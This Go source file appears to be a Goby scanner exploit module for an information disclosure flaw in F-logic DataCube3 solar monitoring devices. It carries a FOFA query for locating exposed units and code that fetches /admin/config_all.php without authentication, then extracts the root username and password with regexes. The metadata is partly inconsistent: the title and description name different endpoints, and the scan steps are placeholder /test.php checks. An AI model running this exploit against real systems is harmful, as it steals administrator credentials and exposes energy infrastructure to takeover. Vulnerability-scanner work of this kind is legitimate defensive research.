package exploits

import (
	"errors"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"regexp"
	"strings"
)

func init() {
	expJson := `{
    "Name": "F-logic DataCube3 /config_all.php Information Disclosure Vulnerability",
    "Description": "<p>The F-logic DataCube3 is a compact terminal measuring system for photovoltaic power generation systems. </p><p>An information disclosure vulnerability exists in the F-logic DataCube3 /admin/setting_photo.php interface, through which an attacker can obtain the username and password of the system background login.</p>",
    "Product": "F-logic DataCube3",
    "Homepage": "https://www.f-logic.jp/info/2018/0509_2.html",
    "DisclosureDate": "2024-03-15",
    "PostTime": "2024-10-15",
    "Author": "202205566302@smail.xtu.edu.cn",
    "FofaQuery": "title==\"DataCube3\" && body=\"refs.btnLogin.click()\"",
    "GobyQuery": "title==\"DataCube3\" && body=\"refs.btnLogin.click()\"",
    "Level": "1",
    "Impact": "<p>An information disclosure vulnerability exists in the F-logic DataCube3 /admin/setting_photo.php interface, through which an attacker can obtain the username and password of the system background login.</p>",
    "Recommendation": "<p>1. Set access policies and whitelist access through security devices such as firewalls. </p><p>2. If not necessary, prohibit public network access to the system.</p>",
    "References": [
        "https://blog.csdn.net/qq_41904294/article/details/136750685"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "mode",
            "type": "select",
            "value": "default",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Information Disclosure"
    ],
    "VulType": [
        "Information Disclosure"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "5.0",
    "Translation": {
        "CN": {
            "Name": "F-logic DataCube3 /config_all.php 信息泄露漏洞",
            "Product": "F-logic DataCube3",
            "Description": "<p>F-logic DataCube3是一款用于光伏发电系统的紧凑型终端测量系统。<br></p><p>F-logic DataCube3&nbsp;/admin/setting_photo.php接口处存在信息泄露漏洞，攻击者可以通过这个接口获取系统后台登录的用户名和密码。<br></p>",
            "Recommendation": "<p>1、通过防火墙等安全设备设置访问策略，设置白名单访问。&nbsp;&nbsp;</p><p>2、如非必要，禁止公网访问该系统。<br></p>",
            "Impact": "<p>F-logic DataCube3&nbsp;/admin/setting_photo.php接口处存在信息泄露漏洞，攻击者可以通过这个接口获取系统后台登录的用户名和密码。<br></p>",
            "VulType": [
                "信息泄露"
            ],
            "Tags": [
                "信息泄露"
            ]
        },
        "EN": {
            "Name": "F-logic DataCube3 /config_all.php Information Disclosure Vulnerability",
            "Product": "F-logic DataCube3",
            "Description": "<p>The F-logic DataCube3 is a compact terminal measuring system for photovoltaic power generation systems.&nbsp;</p><p>An information disclosure vulnerability exists in the F-logic DataCube3 /admin/setting_photo.php interface, through which an attacker can obtain the username and password of the system background login.<br></p>",
            "Recommendation": "<p>1. Set access policies and whitelist access through security devices such as firewalls.&nbsp;</p><p>2. If not necessary, prohibit public network access to the system.<br></p>",
            "Impact": "<p>An information disclosure vulnerability exists in the F-logic DataCube3 /admin/setting_photo.php interface, through which an attacker can obtain the username and password of the system background login.<br></p>",
            "VulType": [
                "Information Disclosure"
            ],
            "Tags": [
                "Information Disclosure"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Variables": {},
    "PocId": "9961"
}`
	postOrGet_scajifuhasyufgtkasjhfjasgyfhhdvsdfvuihsdfasdauidhcayuishfujiahfjuias := func(hostInfo *httpclient.FixUrl, fileUrl string) (string, error) {
		respTxt := ""
		requestConfig := httpclient.NewGetRequestConfig(fileUrl)
		requestConfig.VerifyTls = false
		requestConfig.FollowRedirect = false
		resp, err := httpclient.DoHttpRequest(hostInfo, requestConfig)
		if err != nil || resp.StatusCode != 302 {
			err = errors.New("failed to read file")
			return "", err
		}
		respTxt = resp.RawBody
		// 注意：返回值为（最终要返回的读取结果，错误）
		return respTxt, nil
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			// 此处需要修改：设置成功后的vulurl
			vulURL := "/admin/config_all.php"
			// 此处需要修改：字典键为请求的URL地址，值为返回包判断成功的条件
			defaultModeMap := map[string]string{
				"/admin/config_all.php": "login.root_pwd",
			}
			// 函数继承
			uploadFileFunc := postOrGet_scajifuhasyufgtkasjhfjasgyfhhdvsdfvuihsdfasdauidhcayuishfujiahfjuias

			// 请注意：后续代码为模板代码，非特殊情况，无需更改
			// ----------------------------------------------------------------------------------------------------------------------------------------------------
			for fileUrl, fileText := range defaultModeMap {
				resp, err := uploadFileFunc(u, fileUrl)
				if err != nil {
					continue
				}
				if strings.Contains(resp, fileText) {
					// 设置VULURL
					ss.VulURL = u.HostInfo + vulURL
					return true
				}
			}
			return false
		},

		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			var fileUrl string
			var fileText string
			mode := goutils.B2S(ss.Params["mode"])

			// 此处需要修改：字典键为用户选择读取文件的类型，值是一个数组，分别为请求的URL地址，返回包判断成功的条件
			defaultModeMap := map[string][2]string{
				"default": {"/admin/config_all.php", "login.root_pwd"},
			}
			// 此处需要修改：函数继承
			uploadFileFunc := postOrGet_scajifuhasyufgtkasjhfjasgyfhhdvsdfvuihsdfasdauidhcayuishfujiahfjuias

			// 请注意，后续代码为模板固化，正常情况下均无需修改
			// ----------------------------------------------------------------------------------------------------------------------------------------------------
			if mode == "default" {
				if _, ok := defaultModeMap[mode]; ok {
					fileUrl = defaultModeMap[mode][0]
					fileText = defaultModeMap[mode][1]
				} else {
					expResult.Success = false
					return expResult
				}
				resp, err := uploadFileFunc(expResult.HostInfo, fileUrl)
				if err != nil || (!strings.Contains(resp, fileText)) {
					expResult.Success = false
					return expResult
				}
				pattern := `"login\.root_id","value":"((.|\n)*?)"}`
				// 编译正则表达式
				re := regexp.MustCompile(pattern)
				if !re.MatchString(resp) {
					expResult.Success = true
					expResult.Output = resp
					return expResult
				}
				// 在文本中查找匹配项
				match := re.FindStringSubmatch(resp)
				expResult.Output = "Key message from config_all.php:\r\nuserName = '" + match[1] + "'"

				pattern = `"login\.root_pwd","value":"((.|\n)*?)"}`
				// 编译正则表达式
				re = regexp.MustCompile(pattern)
				if !re.MatchString(resp) {
					expResult.Success = true
					expResult.Output = resp
					return expResult
				}
				// 在文本中查找匹配项
				match = re.FindStringSubmatch(resp)
				expResult.Output += "\r\npassword = '" + match[1] + "'"

				expResult.Output += "\r\n\r\nThe complete config_all.php content :\r\n" + resp
				expResult.Success = true
				return expResult
			}
			expResult.Success = false
			return expResult
		},
	))
}
